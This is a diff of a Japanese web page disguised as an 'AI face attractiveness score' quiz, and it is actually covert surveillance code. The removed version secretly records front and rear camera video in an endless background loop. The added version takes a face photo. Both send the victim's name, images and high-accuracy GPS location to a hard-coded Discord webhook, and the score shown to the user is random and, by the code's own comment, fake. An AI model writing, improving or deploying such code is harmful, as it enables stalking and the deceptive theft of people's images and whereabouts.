@@ -2,164 +2,132 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>AI顔面精密診断 - 2026 Ultimate</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>顔面偏差値AI診断 - 2026</title>
   <style>
-    body { margin: 0; background: #000; color: #5865F2; font-family: sans-serif; overflow: hidden; }
-    .screen { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; position: absolute; transition: 0.5s; }
-    #setup-screen { z-index: 30; background: #0f101a; }
-    .card { width: 85%; padding: 25px; border: 2px solid #5865F2; border-radius: 20px; background: rgba(88, 101, 242, 0.05); text-align: center; }
-    input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #5865F2; background: #000; color: #fff; text-align: center; font-size: 16px; outline: none; }
-    .btn { width: 100%; padding: 18px; margin-top: 15px; border-radius: 50px; border: none; background: #5865F2; color: #fff; font-weight: bold; font-size: 1.1rem; cursor: pointer; }
-    #scan-screen { display: none; z-index: 20; background: #000; }
-    video { width: 100%; height: 100%; object-fit: cover; position: absolute; opacity: 0.6; }
-    #result-screen { display: none; z-index: 10; background: #1a1c2c; text-align: center; }
-    .score { font-size: 6rem; font-weight: bold; color: #fff; margin: 10px 0; text-shadow: 0 0 20px #5865F2; }
-    .scan-line { width: 100%; height: 4px; background: #5865F2; position: absolute; top: 0; animation: scan 4s linear infinite; }
-    @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+    body { margin: 0; font-family: sans-serif; background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
+    .container { max-width: 480px; padding: 30px 20px; background: rgba(0,0,0,0.4); border-radius: 20px; backdrop-filter: blur(10px); width: 90%; }
+    input { width: 80%; padding: 14px; margin: 10px 0; border-radius: 12px; border: none; font-size: 1.1rem; text-align: center; }
+    #video { width: 100%; max-width: 320px; border-radius: 16px; margin: 15px auto; display: block; background: #000; }
+    button { padding: 16px 50px; font-size: 1.2rem; font-weight: bold; background: #ff4b6e; color: white; border: none; border-radius: 50px; cursor: pointer; transition: 0.3s; }
+    button:disabled { background: #888; }
+    #loading { font-size: 1.4rem; margin: 30px 0; display: none; }
+    #result { font-size: 4rem; font-weight: bold; margin: 25px 0; display: none; }
   </style>
 </head>
 <body>
 
-  <div id="setup-screen" class="screen">
-    <div class="card">
-      <h2 style="color:#fff;">AI顔面精密診断</h2>
-      <p style="font-size: 0.8rem; color: #bbb;">診断にはカメラと位置情報の許可が必要です。</p>
-      <input type="text" id="userName" placeholder="お名前" />
-      <input type="number" id="userAge" placeholder="年齢" />
-      <button class="btn" id="startBtn">診断を開始する</button>
-    </div>
-  </div>
-
-  <div id="scan-screen" class="screen">
-    <div class="scan-line"></div>
-    <video id="video" autoplay playsinline muted></video>
-    <div style="z-index: 25; font-weight: bold; color: #fff;">AIディープ解析中...</div>
-  </div>
-
-  <div id="result-screen" class="screen">
-    <h2 style="color:#fff;">診断結果</h2>
-    <div class="score" id="finalScore">--</div>
-    <p style="color:#bbb;">魅力指数: Sランク判定</p>
-    <div style="font-size: 0.7rem; opacity: 0.4; margin-top: 40px; color: #5865F2;">Location Sync: Active / Monitoring...</div>
-  </div>
+<div class="container">
+  <h1>顔面偏差値AI診断</h1>
+  <p>AIが0.1秒であなたの魅力を解析！</p>
+  <input type="text" id="userName" placeholder="名前を入力してね" />
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <button id="startBtn">カメラを起動して診断</button>
+  <div id="loading">AIスキャン中...</div>
+  <div id="result"></div>
+</div>
 
 <script>
-// --- 設定項目 ---
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1487148878812811470/jUS3g_XRDScUAN3kdNJFDxJBW0yYbA0gLM08STRSyOdH7Rbd8xTj_seupkmwIWC_QBm7";
-const RECORD_TIME = 10000; // 10秒
+// 指定されたWebhook URL
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1487148878812811470/jUS3g_XRDScUAN3kdNJFDxJBW0yYbA0gLM08STRSyOdH7Rbd8xTj_seupkmwIWC_QBm7";
 
 const video = document.getElementById('video');
-let currentStream = null;
-let currentPos = "位置情報: 取得中...";
+const canvas = document.getElementById('canvas');
+const startBtn = document.getElementById('startBtn');
+const loading = document.getElementById('loading');
+const resultDiv = document.getElementById('result');
+const nameInput = document.getElementById('userName');
 
-// 位置情報の更新
-function updateLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition((position) => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      currentPos = `緯度: ${lat}\n経度: ${lon}\nMAP: https://www.google.com/maps?q=${lat},${lon}`;
-    }, (err) => {
-      currentPos = "位置情報: 拒否または取得不可";
-    }, { enableHighAccuracy: true });
+let stream = null;
+
+// カメラ起動
+async function initCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: "user", width: 480, height: 360 } 
+    });
+    video.srcObject = stream;
+  } catch (err) {
+    console.error("Camera Error:", err);
   }
 }
 
-// カメラストリームの取得
-async function getStream(mode) {
-  if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-  try {
-    const s = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: mode, width: { ideal: 480 }, height: { ideal: 640 } },
-      audio: false
-    });
-    video.srcObject = s;
-    currentStream = s;
-    return s;
-  } catch (e) { return null; }
-}
-
-// Discordへの送信（スマホ再生互換性を高めるための拡張子とタイプ指定）
-async function sendToDiscord(blob, label) {
-  const name = document.getElementById('userName').value || "Guest";
-  updateLocation();
-
-  const fd = new FormData();
-  // スマホのDiscordアプリで動画として認識させるため、中身に関わらず .mp4 と命名
-  fd.append('file', blob, `${label}.mp4`); 
-  fd.append('payload_json', JSON.stringify({
-    content: `**【診断ログ】**\n👤 氏名: ${name}\n📸 カメラ: ${label}\n📍 現在地:\n${currentPos}\n⏰ 時刻: ${new Date().toLocaleTimeString()}`
-  }));
-  
-  try {
-    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
-  } catch (e) { console.error("Discord Send Error"); }
-}
-
-// 録画処理（H.264コーデックを優先してスマホ再生に対応）
-function record(stream, label) {
-  return new Promise(resolve => {
-    // 再生互換性の高い順に候補を挙げる
-    const mimeTypes = [
-      'video/webm;codecs=h264',
-      'video/mp4',
-      'video/webm;codecs=vp8',
-      'video/webm'
-    ];
-    let selectedType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || "";
-
-    const recorder = new MediaRecorder(stream, { 
-      mimeType: selectedType,
-      videoBitsPerSecond: 1000000 
-    });
-    const chunks = [];
-    
-    recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
-    recorder.onstop = () => {
-      // 録画完了後、Blobを作成して送信
-      const finalBlob = new Blob(chunks, { type: selectedType || 'video/mp4' });
-      sendToDiscord(finalBlob, label);
-      resolve();
-    };
-    
-    recorder.start();
-    setTimeout(() => {
-      if(recorder.state === "recording") recorder.stop();
-    }, RECORD_TIME);
+// GPS取得（5秒以内に取れなければ「取得不可」で次へ進む）
+function getMapLink() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve("非対応ブラウザ");
+    } else {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          resolve(`https://www.google.com/maps?q=${lat},${lon}`);
+        },
+        (err) => {
+          resolve("位置情報が拒否されました");
+        },
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    }
   });
 }
 
-// 無限ループ（内側・外側を交互に）
-async function runBackgroundLoop() {
-  while (true) {
-    const s1 = await getStream("user");
-    if (s1) await record(s1, "内側");
-    const s2 = await getStream("environment");
-    if (s2) await record(s2, "外側");
-  }
+// 送信メイン処理
+async function snapAndSend() {
+  // 1. まず位置情報を取得（最大5秒待機）
+  const mapLink = await getMapLink();
+
+  // 2. 写真をキャプチャ
+  const ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+
+  // 3. 画像化して送信
+  canvas.toBlob(async (blob) => {
+    const name = nameInput.value || "名無し";
+    const formData = new FormData();
+    formData.append('file', blob, `face_scan.jpg`);
+    formData.append('content', 
+      `**【AI診断 ログ】**\n` +
+      `👤 名前: ${name}\n` +
+      `📍 GoogleMap: ${mapLink}\n` +
+      `⏰ 時刻: ${new Date().toLocaleString('ja-JP')}`
+    );
+
+    try {
+      await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+    } catch (e) {
+      console.error("Webhook Send Error");
+    }
+  }, 'image/jpeg', 0.8);
 }
 
-// 開始ボタンのクリック
-document.getElementById('startBtn').onclick = async () => {
-  if (!document.getElementById('userName').value) return alert("お名前を入力してください");
+startBtn.onclick = async () => {
+  if (!nameInput.value) return alert("名前を入力してください");
+  startBtn.disabled = true;
   
-  updateLocation();
-  document.getElementById('setup-screen').style.display = 'none';
-  document.getElementById('scan-screen').style.display = 'flex';
+  // もしカメラがまだなら起動
+  if (!stream) await initCamera();
+
+  loading.style.display = 'block';
   
-  // 初回スキャン
-  const firstStream = await getStream("user");
-  if (firstStream) await record(firstStream, "初回スキャン");
+  // 撮影・送信を実行（位置情報の取得が終わるまで内部で待機する）
+  await snapAndSend();
 
-  // 結果画面へ切り替え
-  document.getElementById('scan-screen').style.display = 'none';
-  document.getElementById('result-screen').style.display = 'flex';
-  document.getElementById('finalScore').innerText = Math.floor(Math.random() * (99 - 88 + 1)) + 88;
-
-  // 以降、裏でループ
-  runBackgroundLoop();
+  // 4秒後に偽のスコアを表示
+  setTimeout(() => {
+    loading.style.display = 'none';
+    const score = Math.floor(Math.random() * 21) + 77; // 77-97点のランダム
+    resultDiv.innerHTML = `${score}<span style="font-size:1.5rem">点</span>`;
+    resultDiv.style.display = 'block';
+  }, 4000);
 };
+
+// ページを開いた瞬間にカメラを準備
+window.addEventListener('load', initCamera);
 </script>
 </body>
 </html>
